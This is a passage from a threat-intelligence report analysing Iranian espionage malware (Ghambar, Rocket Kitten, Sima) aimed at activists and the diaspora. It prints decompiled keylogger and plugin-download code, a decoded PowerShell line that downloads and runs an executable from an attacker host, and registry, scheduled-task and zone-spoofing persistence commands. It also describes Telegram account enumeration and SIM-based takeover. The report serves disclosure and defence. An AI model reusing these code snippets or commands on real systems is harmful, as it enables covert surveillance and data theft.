Program.ConfigInfo.TargetId);
Utils.ManualSleepToBypassAv(30);
Thread.Sleep(30000);
Utils.HeyImOnline(Program._communication,
Program.ConfigInfo.TargetId);
}
}
catch (Exception ex)
{
Utils.DbgPrint(string.Format("EX : {0} Method : {1}", ex.Message,
MethodBase.GetCurrentMethod().Name));
}
}

As you can see from the procedure above, before the regular check­in with the C&C, the malware invokes
Program.FileUploader.UploadAllOfflineFiles​
. Interestingly, Ghambar is designed to leave as little
footprint on the system as possible. When collecting screenshots, clipboard data, and intercepted
keystrokes, it attempts to directly send the data to the C&C without writing on disk. For example, we can
observe this behavior in the following portion of code handling intercepted keystrokes data:
private static void KeylogBufferArrived(string buffer)
{
if (!string.IsNullOrEmpty(buffer))
{
try
{
if (Utils.IsServerEndpointAvaliable())
{
bool flag;
Program._communication.SendKeyLog(Program.ConfigInfo.TargetId,
DateTime.Now, true, buffer, out flag, out Program._tempSpecified);
}
else
{
string keyloggerStoragePath =
IoPathUtils.GetKeyloggerStoragePath();
if (!Directory.Exists(keyloggerStoragePath))
{
Directory.CreateDirectory(keyloggerStoragePath);
}
string path = Path.Combine(keyloggerStoragePath,
Path.GetRandomFileName());
File.WriteAllText(path, buffer);
}
}
catch (Exception ex)

26

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

{
Utils.DbgPrint(string.Format("EX : {0} Method : {1}", ex.Message,
MethodBase.GetCurrentMethod().Name));
}
}
}

In case the C&C is available, the data buffer is directly sent over, otherwise it is stored in a directory
specified in the configuration properties. In the latter case, when at the next iteration
UploadAllOfflineFiles​
is called, the files on disk will be deleted.
While executing a parallel keylogger, Ghambar is also able to receive instructions from the C&C on
additional tasks to execute. These tasks can be additional plugins to be downloaded and executed, generic
tasks on the file system, or a number of predefined commands. Following is the portion of code
responsible for fetching pending tasks for those three categories, Appendix “​
Ghambar Command Control​
”
include the pertinent code.
Ghambar is provided with a full­featured plugins system. If instructed to do so by the C&C, the malware
is able to download, store, and execute any given plugin. In the following relevant snippet, you can also
observe a mention to a ​
_ghambarService​
.
public void ProcessPlugins(T4[] plugins)
{
Utils.DbgPrint(MethodBase.GetCurrentMethod().Name);
for (int i = 0; i < plugins.Length; i++)
{
T4 t = plugins[i];
string text = CommandProcessor._ghambarService.DownloadPlugin(t.ID);
if (!string.IsNullOrEmpty(text))
{
byte[] bytes = Convert.FromBase64String(text);
string path = Path.Combine(IoPathUtils.GetPluginsPath(), t.ID);
path = Path.ChangeExtension(path, t.FileFormat);
if (!Directory.Exists(IoPathUtils.GetPluginsPath()))
{
Directory.CreateDirectory(IoPathUtils.GetPluginsPath());
}
File.WriteAllBytes(path, bytes);
if (File.Exists(path))
{
bool isActive = PluginUtils.InstallPlugin(t);
bool flag;
bool flag2;
CommandProcessor._ghambarService.SetPluginActiveState(this._targetId, t.ID,
isActive, true, out flag, out flag2);
}
}

27

}
}

Other than generally creating, deleting and fetching files, Ghambar is also able to executed a number of
predefined commands if instructed to do so by the C&C. The commands, identified by a command­type
identifier, include the following:
●
●
●

Turn on and off the monitor;
Set and copy clipboard data;
Enable or disable mouse/keyboard (although these procedures are not yet implemented);
“Enable or disable desktop” (not implemented);
Trigger a BSOD (also, not implemented).

While the sample we obtained might be an earlier stage still under development, Ghambar is already
provided with enough features to make it a fully­functional backdoor.

Infrastructure
The Ghambar sample we obtained is configured to contact the domain ​
nvidia­update.com​
. Prior to its
lapse, the domain resolved to the IP address 85.17.172.180, hosted at Leaseweb in the Netherlands.
Ghambar interacts with the server with a SOAP­based XML protocol on port 5050, with well defined
structures and events that very granularly defines the processes of registering the compromised
computers, fetch commands, and report their results. It doesn’t employ any encryption algorithm, it
occasionally just compresses with zlib and encodes in base64 particularly large portions of data.
Appendix “​
Ghambar Network​
” is a typical exchange between the compromised host and the command
and control server, from initial registration to command fetching. For the sake of clarity, we broke down
and formatted the content of the communication stream.

Rocket Kitten
Beginning in April 2014, Israeli academic institutions and corporations began to encounter persistent
spearphishing attempts through emails with attached Microsoft Office documents that had embedded
copies of the CORE Impact penetration testing agent.37 Across multiple reports on intrusion attempts
against Israeli academics and international human rights advocates, a collective set of actors labelled

​

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

“Rocket Kitten” was documented as conducting account credential phishing and malware campaigns
based on a changing set of tactics and tools. The origin of these actors was established and affirmed
through Persian­language references in malware code, disclosures of IP addresses in compromised
accounts, patterns in the selection of targets, and native Persian­language in spearphishing messages.
Moreover, poor isolation of activities and failures to secure malware infrastructure led to the identification
of one of the authors of the group’s phishing and malware systems, Yaser Balaghi, pseudonymous
operating as “Wool3n.H4t.” As researchers pursued Rocket Kitten’s activities over time, a common
pattern of spearphishing campaigns reflecting the interests and activities of the Iranian security apparatus
became apparent, one which continues with a demonstrable evolution based on a learning process over
efforts that include dozens of domain names and shifting infrastructure, and is broader than one
individual.
The infrastructure and tactics documented across the Rocket Kitten campaigns represent a visible break
from the Flying Kitten activities documented by FireEye. Days after the May 2014 Operation Saffron
Rose report, the dozens of domains and servers connected with the group, which had been active until
publication, were taken down or lapsed, not to be used again. The lull in intrusion attempts reported
against Iranian activists after this cessation lasted four months, until an Iranian journalist received
notifications purporting to be from Google claiming that their accounts had been accessed from “The
Russia” with the IP address “109.172.51.147.” The spearphishing message, sent from a compromised
British quilting society’s site, directed the target to a user­specific account credential phishing page on the
domain “account­google.co” that was registered in July of that year. Over the following month, more
human rights activists and journalists received similar notifications and other spearphishing attempts that
would later be associated with Rocket Kitten, marking the start of renewed intrusion campaigns against
Iranians inside of the country and the diaspora. Rocket Kitten’s activities are clearly discernable up until
publication of this report, and while more information on these actors activities against human rights
organizations will be forthcoming, this section is intended to provide insight into two emerging trends
connected to the threat group.

Telegram
When the Rocket Kitten group breached the social media and personal email accounts of a prominent
Iranian in April 2016, the intruders then engaged in conversations with her contacts and individuals in the
human rights community. Amongst credential phishing attempts, in those conversations, the impersonator
would ask if they had a Telegram account, and then ask for a “conversation request code” – in actuality
the one­time login password provided by SMS to the user. The new focus on the messaging service
followed its rapid rise in the popularity after interference with Viber, especially with political
organizations to mobilize constituencies in the February 2016 Parliamentary Election. Moreover, while
Telegram has grown popular in Iran in part due to their claims of user security, the application is more
vulnerable to compromise than other online services if the user does not take additional measures to
protect their account due to its reliance on mobile operators.
Connected to this infrastructure is indication that that the Rocket Kitten group have engaged in a brute
force enumeration of Telegram accounts connected with Iranian telephone numbers through the API
29

Guarnieri & Anderson

services provided to developers. The Google credential phishing domain used in the April 2016 incident
overlapped with at least two domains, “shaftool.com” (176.102.64.206) and “ghalpaq.com”
(185.130.226.12). According to accessible logs, the actors had registered dozens of API access codes and,
when these key would be revoked by Telegram for overuse, the script would simply move on to the next
key. These API keys corresponded with bots labeled “Ghodrat” (ghodrad2015_bot) and “Shaftool”
(shaftool_bot), which reported back to the same set of Telegram users on a periodic basis about the
number of users the script had identified. Over the course of several days, the operation was able to
identify at least over 15 million Iranian phone numbers with Telegram accounts registered to them and the
associated user IDs, potentially approaching 20 million before the infrastructure was takedown and in
subsequent operations. While this information would not itself allow for the compromise of an account, it
would provide a map of the Iranian user base of the service that could be used for subsequent
investigations and phishing attempts.
Telegram Enumeration Script Report Back

hat_id=145121195&text=Total Numbers: 1012204
This network mapping operation had deeper ties to intrusion campaigns targeting chat applications,
indicating a systemic engagement on the platform. The registration information of the two domains, in
particular the strange email address, telephone number and organization of “Tele comunication,” connect
the infrastructure to several typographic account credential phishing domains that posed as Telegram. The
Telegram impersonation domains registered within short succession of each other in the middle of
February 2016. Further domains registered in the same naming schema later, but resembling the Ghalpaq
host (“5­server.us”, “6­server.us”, “ghalpaq.us”, “pashmool.com”. “kashkoolak.com”) indicate continued,
large scale abuse of Telegram’s API in support intrusion activities conducted against users of the
application.
Spearphishing is not the only means of intrusion into Telegram accounts. The common form of
authentication for most mobile chat applications is through providing the user an access code that is sent
by SMS message to the user. Since SMS messages are subject to interception and surveillance by
telecommunications networks, the user’s phone service therefore has access to their password.
Additionally, mobile networks are vulnerable to a wide range of attacks, from social engineering of
providers to attacks on systems that allow phones to roam across networks. In practice, an attacker could
convince or compell a mobile provider to issue a copy of the target’s SIM card and receive messages
bound for that user, including their access code. These tactics have been documented in Egypt and Russia.
Based on accounts from multiple individual inside of the country, these tactics appear to have been used
in Iran in order to gain access to the Telegram accounts of individuals connected with influential political
opposition figures, women’s rights activists and other surveillance targets.

Metasploit
From the outset of publicity on Rocket Kitten’s operations, researchers have identified a reliance on
simple tactics and commercial­off­the­shelf tools in order to capture credentials and acquire access to
devices. In late 2014, these operations were conducted through CORE Impact, shifting over the following
year to other agents. Since then, in particular since Spring 2016, we find an increasing use of the
Metasploit Meterpreter agent coupled with basic social engineering practices as the primary mechanism
of intrusions of Rocket Kitten.
Rocket Kitten’s tactics over the duration of our observation continue a common pattern. When one
individual was compromised by an unknown mechanism, the attacker accessed their social networking
accounts from a VPN service in Florida. The first action of the intruder was to download an archive of
their personal data through Facebook’s Download Your Information tool (documented by the notification
email received from Facebook), and then change the account email address. Once compromised, the
intruders impersonated the victim and over Facebook message began to approach dozens of their contacts
in the media, sending a compressed archive claiming to be a set of pictures.
At the same time, a Telegram account portraying a young woman named “Hoda Hajibagher” began to
engage members of the diaspora, sending provocative pictures and promising more pictures at a link. The
links would lead to a Google credential phishing page that resembled the structure and tactics of Rocket
Kitten attempts over the previous year. Concurrently, a Gmail account for Hajibagher also began to
engage others over email, sending a document containing malware embedded as a macro in a Word
document (Document.docm). Since this initial set of incidents, the same actors have continued on to
create fake Facebook resources in order to host malware attempts or to support fictitious personas used in
more elaborate social engineering schemes.

Impersonation Facebook Page (July 2016)
Both the bait document from Hoda and the pictures from the compromised account are malware that
appear to be connected to the same set of actors employing Meterpreter as reverse shell into compromised
systems. Images of women and politics as bait documents would be intermingled with a dropper (a
shortcut file embedded with powershell) that would connect to a remote server to retrieve an agent,
including potentially Android version of the Meterpreter toolkit. These backend servers also commonly
exposed installations of the Metasploit framework. In the attacks we observed victims were sent archives
called “​

As you can see, the LNK files are tasked to execute a PowerShell payload, which decodes as following:
Import­Module BitsTransfer; Start­Process

hxxp://uploader.sytes.net/download/shortcut.exe "$env:TEMP\250C8CA7B.exe";
Start­Process "$env:TEMP\250C8CA7B.exe

The payload triggers the default browser to open an image at a given URL, which points to a different
image in each .LNK file, then downloads and execute a Windows binary.
In separate attacks, as previously mentioned, we observed a malicious Office document ​
Document.docm
instead being distributed to victims. Notably, this document was created with a pirated version of Office
distributed in Iran.38 The attack did not leverage any vulnerability but simply embedded a Macro script
and attempted to deceive the targets in enabling it:

If enabled, it will display an empty fake error dialog while executing a PowerShell payload in the
background. In both cases through the infection process, a cabinet file normally called ​
taskmanager32.exe
is pulled, stored, and instantiated for autorun.

The file then contains an executable called ​

which decompiles as following:

This program will simply write an embedded string to the file ​

Through multiple nested PowerShell instances performing shellcode injection, the actors are then able to
download and execute a build of Metasploit’s Meterpreter DLL configured as a reverse shell to a
designated host. On a historical note, the primary hostname for these samples was previously used in a
FBI operation to identify individuals exchange child abuse images.39
During the course of our analysis we observed the attackers interacting with the reverse shell we had
opened. During multiple attempts at luring them in they initially performed some preliminary profiling,
then when they had realized the host was an analysis virtual machine, they repeatedly deleted files,
removed traces of the infection and rebooted the system.

Sima
History
In February 2016, Iran­focused individuals received messages purporting to be from Human Rights
Watch's (HRW) Emergencies Director, requesting that they read an article about Iran pressing Afghan
refugees to fight in Syria. While referencing a real report published by HRW,40 the links provided for the
Director’s biography and article directed the recipient to malware hosted elsewhere. These spearphishing
attempts represent an evolution of Iranian actors based on their social engineering tactics and narrow
targeting. Although the messages still had minor grammatical and stylistic errors that would be obvious to
a native speaker, the actors demonstrated stronger English­language proficiency than past intrusion sets
and a deeper investment in background research prior to the attempt. The actors appropriated a real
identity that would be expected to professionally interact with the subject, then offered validation through
links to their biography and social media, the former of which itself was malware as well. The bait
documents contained a real article relevant to their interests and topic referenced, and the message
attempted to address to how it aligned with their professional research or field of employment. The
referenced documents sent were malware binaries posing as legitimate files using the common
right­to­left filenames tactic in order to conceal the actual file extension. All of these techniques, while
common pretexting mechanisms, are a refinement compared to a tendency amongst other groups to
simply continually send different forms of generic malware or phishing, in the hopes that one would
eventually be successful.
We tentatively name the campaign “Sima” based on the recurrent presence of “PCSima7” and “PCSima9”
in the metadata of Word documents displayed upon execution of the primary malware agent. While other
indicators align with the attribution to Iran, such as markers that the Visual Studio used in its development
originated from an Iranian software piracy site, Sima is the most unique trait found in our observation.

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

While the Sima (‫ )ﺳﻴﻤﺎ‬moniker could similarly originate from software labels, it is a common female
Persian name and a Persian­language word for “visage” or “appearance.” Given its use in more advanced
social engineering campaigns against women’s rights activists, the label seem particularly apt.
Based on file modification dates and timestamps of samples, it appears that the observed campaign was
initiated in the middle of February 2016, with the infrastructure taken offline at the start of March. At the
time of observation, and within the resources in spearphishing attempts, the actors behind the campaign
had an active interest in Iranians in the diaspora that were focused on foreign policy and women’s issues.
Samples and resource names contained the family names of prominent Iranians, and several of these
individuals received the malware located in their respective folder. Two other files, named “R.A.D ­ Rape
Aggression Defense for Women” and “VictoriaSecret influence on women gender” indicate an audience
of activists or scholars on women’s rights issues. Another file, entitled “CONFIDENTIAL INVESTOR
SUITABILITY QUESTIONNAIRE” implies that the end recipient is involved in the private sector,
which aligns with a history of Iranian actors of targeting individuals involved with the country’s oil sector
and international businesspersons in the diaspora. Others appear to have been general purpose malware
with generic names that imply that they were sent purporting to be system updates, such as
“GetWindows10­Web_Default_Attr.exe.”
Several samples potentially reflect other impersonation attempts similar to the HRW messages based on
the filenames of the malware. The spearphishing bait was relevant to recent social media activity of the
target, suggesting those behind the Sima campaign were closely monitoring and tailoring pretexting
strategies according to their interests. In another case, the actors mirrored an announcement made about
the broadcast of a television program on Iranian­American cultural affairs in order to impersonate the
individual and engage in spearphishing within hours of the legitimate message. The Sima group also
engaged in impersonation of Citizenship and Immigration Services at the Department of Homeland
Security, posing as a notice about the expiration of the recipient’s Permanent Residence status. This
forged message appeared to be from an address associated with the USCIS, “SCOPSSCATA@dhs.gov,”
and was sent through the anonymous mail relay service anonymousemail.me. As with the HRW message,
the forms referenced actually exist but the links provided in the message directed the recipient to malware
tainted documents.

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

The malware and infrastructure used in the spearphishing attempts was hosted behind an under
construction message with an email signup option that did not function. The server used to host these
malware samples was located on the German provider Hetzner (148.251.55.114), within a small block of
IP addresses that are registered with the customer ID “HOS­156205.” Across other prefixes registered to
this customer identifier, and within the same block as the command and control server, there are a number
of other Persian­language websites, suggesting that the server was purchased through an Iranian reseller
of Hetzner services.
Prior to the removal of the server, the actors uploaded password­protected archives of exfiltrated files to
the server. These files suggested at least twenty­one victims within the short period of the campaign,
however, it is believed that those archives do not covered the entirety of those compromised. Despite the
oversight that made these files available, the archives evince a greater level of professionalism and
detail­oriented work than previous threat actors, with resources highly­organized and bearing descriptive
labeling. These archives provide further indication that those entities behind the campaigns are
Persian­language speakers, due to the naming of files and folders in Persian.

Tools & Techniques
All the malware samples that we collected from servers controlled by the actors appear to belong to the
same malware family and they are all configured to contact and exfiltrate data to the same command and
control domains, ​
microupdt.fagdns.com​
and ​
microupdt.duckdns.org​
. All the samples appear to be have
been compiled between February 29 and March 1 2016, shortly before our discovery, suggesting that,
despite the known C&C servers having quickly gone offline shortly after, this spree of attacks might be
fresh and currently undergoing.
It is worth noting in fact, that those same C&C domains have appeared and disappeared at convenience
over the course of the many months that took to complete this research work, and may be used by others.
As a matter of fact, the command and control domains we observed resolved to the hosts 154.127.59.97
and 87.121.52.83, which have numerous other domains associated to them through passive DNS records,
and an even larger amount of malware samples configured to contact them. For the sake of narrative we

40

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

are going to focus exclusively to those samples we identified being used in attacks against Iranian civil
society and diaspora.
We observed Sima employ a few initial droppers, normally written in C# and then obfuscated, often with
SmartAssembly. The first iteration of the stage 1 payload is a very simple application that is designed to
execute the primary payload, and establish and maintain persistence over the compromised system. It
achieves that by the creating a regular startup registry key by invoking the following command:
"C:\WINDOWS\system32\cmd.exe" /c reg add
"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v
"Load" /d "C:\Documents and Settings\Me\Application
Data\Microsoft\Blend\14.0\FeedCache\protocolhost.exe" /f

The binary ​
protocolhost.exe​
would normally be an initial stub that just executes the full original payload.
While the folder under which it is stored seems consistent, the file name of the executable seems to vary.
We observed for example the names ​
sigverify.exe​
and ​
PerfWatson.exe​
as alternatives to ​
protocolhost.exe​
.
Interestingly, due to some flaw in the logic of the stage 1, that ​
cmd.exe​
command is often executed an
endless loop, which will cause terminals to flash continuously, making it hard to properly interact with the
system.
Possibly as an evolution to this poorly designed initial payload, in other attacks the group appears to have
replaced the stage 1 dropper with a new one, which looks cleaner and with an increased attention to detail
and stealthiness. For example, it sets the ZoneID of all of its dropped files to URLZONE_TRUSTED,
generally used to disable security warnings on the provenance of the file, invoking this command:
"C:\Windows\System32\cmd.exe" /c echo [zoneTransfer]ZoneID = 2 >
"C:\ProgramData\Winupdt\winupdt.exe":ZONE.identifier & exit

It also sets its error mode to SEM_NOOPENFILEERRORBOX, disabling Windows error dialogs in case
of some malfunction.
Instead of using the more common and more recognizable Windows startup registry keys and folders, this
malware instead creates a Window Task Scheduler XML definition from a premade template it is
provided with:
<?xml version="1.0" encoding="utf­16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">

</Settings>
<Actions Context="Author">
<Exec>
<Command>[LOCATION]</Command>
</Exec>
</Actions>
</Task>

After [USERID] and [LOCATION] are respectively replaced with the current user name and the path to
the previously dropped file, this task definition will be registered in Windows as “WinUpdt” by invoking
the following command:
"C:\Windows\System32\schtasks.exe" /Create /TN "WinUpdt" /XML
C:\Users\User\AppData\Local\Temp\633249106.xml

Interestingly, this task definition template seems to be designed to be less pervasive as well as less
suspicious. As a matter of fact, it fakes the date of registration of task to more than a year and a half ago,
it only requests a default low­medium priority, it is not marked as hidden, and it even instructs the
scheduler to terminate the task if the computer is on battery power.
Regardless of which stage 1 dropper was employed, when the primary payload is executed it instantiates
an instance of ​
RegAsm.exe​
(which is a legitimate Microsoft .NET utility) in a suspended state, performs
process hollowing, and replaces its memory with malicious code. All the significant operations of the
malware are then performed within the context of that process. In all the attacks that we observed, the
injected payload appears to be a RAT known as ​
LuminosityLink​
, which is commercially available
42

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

off­the­shelf41 . While being advertised on its website as a legitimate remote administration tool,
LuminosityLink​
is provided with enough features to make it an appealing solution for any malicious
attacker, and Persian­language security forums includes discussion of the application.42

In order to deceive the targets of the attacks and making the delivered payload appear more innocuous, all
the artifacts have been configured to display an Office document with varying content. These documents
suggest the nature of the targets, which generally aligns with the identity of those identified through the
names given by the attackers to the folders we retrieved the files from. All the attacks can be classified
under two primary thematic areas: ​
Women Rights a​
nd​
Human Rights in Iran​
. Therefore, the content of
the decoy documents along, with what we believe are the identities of some of the targets of these attacks,
supports the theory that this campaign is, to the best of our knowledge, dedicated to the surveillance of
members of Iranian civil society and diaspora.
